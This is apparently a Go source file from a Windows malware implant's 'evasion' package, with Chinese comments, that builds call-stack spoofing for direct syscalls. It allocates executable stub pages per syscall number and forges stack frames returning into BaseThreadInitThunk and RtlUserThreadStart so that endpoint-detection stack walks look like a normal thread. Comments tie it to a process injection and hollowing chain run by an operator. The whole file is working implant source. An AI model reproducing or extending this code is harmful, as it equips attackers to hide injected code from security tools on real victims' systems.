//go:build windows && amd64

// 调用栈伪造的运行期装配（amd64）。
//
// 内存布局（全部按 W^X 走"先 RW 写、再 RX 执行"）：
//   - 桩页：每个 SSN 一页 RX。SSN 是 `mov eax, imm32` 的立即数，不同系统调用
//     需要不同的立即数；改立即数要来回翻保护属性（动作可疑），所以按 SSN 建页。
//   - slot 页：RW，8 字节，存伪栈顶。桩用 `mov rax, [imm64]` 每次调用现读，
//     因此同一页桩可被任意伪栈复用。
//   - 伪栈页：RW，帧链每次调用前由 BuildSpoofFrame 刷新。
//
// 并发：slot 与伪栈是**单例**，所以 syscall 序列化在一把互斥锁里。这不影响
// 正确性（NT 调用本身同步），只影响吞吐：注入/镂空链上只有几十次调用，可忽略。

package evasion

import (
	"fmt"
	"sync"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"

	"implant/core/config"
)

var (
	spoofMu sync.Mutex

	// spoofSlot 伪栈顶指针槽（RW，8 字节）
	spoofSlot uintptr
	// spoofStack 伪栈缓冲区基址（RW）
	spoofStack uintptr
	// spoofStackSize 伪栈缓冲区大小
	spoofStackSize uintptr
	// spoofBTIT/spoofRUTS ntdll 内两个合法返回点
	spoofBTIT uintptr
	spoofRUTS uintptr
	// spoofReady 是否装配完成
	spoofReady bool
	// spoofStubCache 已生成的桩页（SSN → RX 页地址）
	spoofStubCache map[uint32]uintptr
)

// spoofStackBytes 伪栈大小：够放 8 个参数 + 帧链 + 余量，一页足够
const spoofStackBytes = 8 * 1024

// PrepareSpoof 装配伪栈与 slot（direct 模式下由 PrepareTrampolines 调用）。
//
// 任一环节失败都返回错误，调用方据此**静默回退**到不伪造的 direct syscall：
// 栈伪造是加分项，装不上不能让整条注入链不可用。
func PrepareSpoof() error {
	spoofMu.Lock()
	defer spoofMu.Unlock()
	if spoofReady {
		return nil
	}
	if err := resolveSpoofReturnPoints(); err != nil {
		return err
	}
	dataPage, err := windows.VirtualAlloc(0, spoofStackBytes+16, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil || dataPage == 0 {
		return fmt.Errorf("分配伪栈页: %v", err)
	}
	spoofSlot = dataPage
	spoofStack = dataPage + 16
	spoofStackSize = spoofStackBytes
	// slot 初值：伪栈顶（16 字节对齐）
	*(*uintptr)(unsafe.Pointer(spoofSlot)) = (spoofStack + spoofStackSize) &^ 15
	spoofStubCache = make(map[uint32]uintptr, 8)
	spoofReady = true
	return nil
}

// resolveSpoofReturnPoints 解析两个「合法返回点」。
//
// BaseThreadInitThunk+0x14 与 RtlUserThreadStart+0x21 是栈回溯中最常见的两个
// 线程入口返回地址：线程起于 RtlUserThreadStart，由 BaseThreadInitThunk 调进
// 用户入口。伪栈把 syscall 的返回地址伪装成前者、链尾接后者，看上去就像
// 「线程正常启动 → 调了某个 API → 进内核」。
//
// 注意**两个符号不在同一个 DLL 里**：BaseThreadInitThunk 由 kernel32 导出
// （ntdll 里没有，实测报"The specified procedure could not be found"），
// RtlUserThreadStart 由 ntdll 导出。
func resolveSpoofReturnPoints() error {
	for _, spec := range []struct {
		dll    string
		name   string
		offset uintptr
		dst    *uintptr
	}{
		{"kernel32.dll", "BaseThreadInitThunk", SpoofBaseThreadInitThunkOffset, &spoofBTIT},
		{"ntdll.dll", "RtlUserThreadStart", SpoofRtlUserThreadStartOffset, &spoofRUTS},
	} {
		p := windows.NewLazySystemDLL(spec.dll).NewProc(spec.name)
		if err := p.Find(); err != nil {
			return fmt.Errorf("解析 %s!%s: %v", spec.dll, spec.name, err)
		}
		*spec.dst = p.Addr() + spec.offset
	}
	return nil
}

// SpoofReady 报告栈伪造是否可用（装配失败时为 false，调用方回退普通 direct 路径）
func SpoofReady() bool {
	spoofMu.Lock()
	defer spoofMu.Unlock()
	return spoofReady
}

// SpoofActive 综合判定"这次调用是否该走伪造栈"：开关（编译期 + 运行期覆盖）
// 为开 **且** 桩已装配成功。
//
// 为什么要单独一个函数：spoofReady 只表示"内存里的桩建好了"，与"操作员要不要
// 用它"是两件事。P4 之前 Syscall() 只看 spoofReady —— 于是只要 syscallMode=direct
// 就必然布伪栈，操作员没有任何办法在会话内把这层额外风险关掉。
func SpoofActive() bool {
	if !config.StackSpoofEnabled() {
		return false
	}
	if reason := config.EvasionImpossibleReason(config.EvasionSpoof); reason != "" {
		return false
	}
	return SpoofReady()
}

// spoofStubFor 取得（必要时生成）指定 SSN 的桩页地址
func spoofStubFor(ssn uint32) (uintptr, error) {
	spoofMu.Lock()
	if addr, ok := spoofStubCache[ssn]; ok {
		spoofMu.Unlock()
		return addr, nil
	}
	ready, slot := spoofReady, spoofSlot
	spoofMu.Unlock()
	if !ready {
		return 0, fmt.Errorf("栈伪造未装配")
	}

	code := BuildSpoofStub(ssn, slot)
	page, err := windows.VirtualAlloc(0, uintptr(len(code)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil || page == 0 {
		return 0, fmt.Errorf("分配桩页(ssn=%d): %v", ssn, err)
	}
	copyBytes(page, code)
	var old uint32
	if err := windows.VirtualProtect(page, uintptr(len(code)), windows.PAGE_EXECUTE_READ, &old); err != nil {
		_ = windows.VirtualFree(page, 0, windows.MEM_RELEASE)
		return 0, fmt.Errorf("桩页降权(ssn=%d): %v", ssn, err)
	}

	spoofMu.Lock()
	defer spoofMu.Unlock()
	if addr, ok := spoofStubCache[ssn]; ok { // 并发下别人先建好了
		_ = windows.VirtualFree(page, 0, windows.MEM_RELEASE)
		return addr, nil
	}
	spoofStubCache[ssn] = page
	return page, nil
}

// syscallSpoofed 以伪造栈执行一次 direct syscall。
//
// 流程：布置伪栈帧 → 写 slot（伪栈顶）→ 调桩 → 返回 NTSTATUS。
// 参数超过 4 个时，第 5 个起由 BuildSpoofFrame 复制到伪栈 SpoofArgOffset 处
// （内核按 x64 约定从 RSP+0x28 起读栈传参）。
func syscallSpoofed(ssn uint32, args []uintptr) (uintptr, error) {
	if len(args) > SpoofMaxArgs {
		return 0, fmt.Errorf("伪栈 syscall 最多支持 %d 个参数，收到 %d", SpoofMaxArgs, len(args))
	}
	stub, err := spoofStubFor(ssn)
	if err != nil {
		return 0, err
	}
	var stackArgs []uintptr
	if len(args) > 4 {
		stackArgs = args[4:]
	}
	frame, err := BuildSpoofFrame(spoofBTIT, spoofRUTS, stackArgs)
	if err != nil {
		return 0, err
	}

	spoofMu.Lock()
	defer spoofMu.Unlock()
	// 帧放在伪栈顶部，枢轴点 16 字节对齐
	pivot := ((spoofStack + spoofStackSize - uintptr(len(frame))) &^ 15)
	if pivot < spoofStack {
		return 0, fmt.Errorf("伪栈帧过大（frame=%d, stack=%d）", len(frame), spoofStackSize)
	}
	copyBytes(pivot, frame)
	*(*uintptr)(unsafe.Pointer(spoofSlot)) = pivot

	callArgs := make([]uintptr, 0, len(args)+1)
	callArgs = append(callArgs, stub)
	callArgs = append(callArgs, args...)
	r1, _, _ := syscall.SyscallN(callArgs[0], callArgs[1:]...)
	return r1, nil
}

// copyBytes 把 src 写到 dst 指向的内存（dst 必须已提交且可写）
func copyBytes(dst uintptr, src []byte) {
	for i, b := range src {
		*(*byte)(unsafe.Pointer(dst + uintptr(i))) = b
	}
}
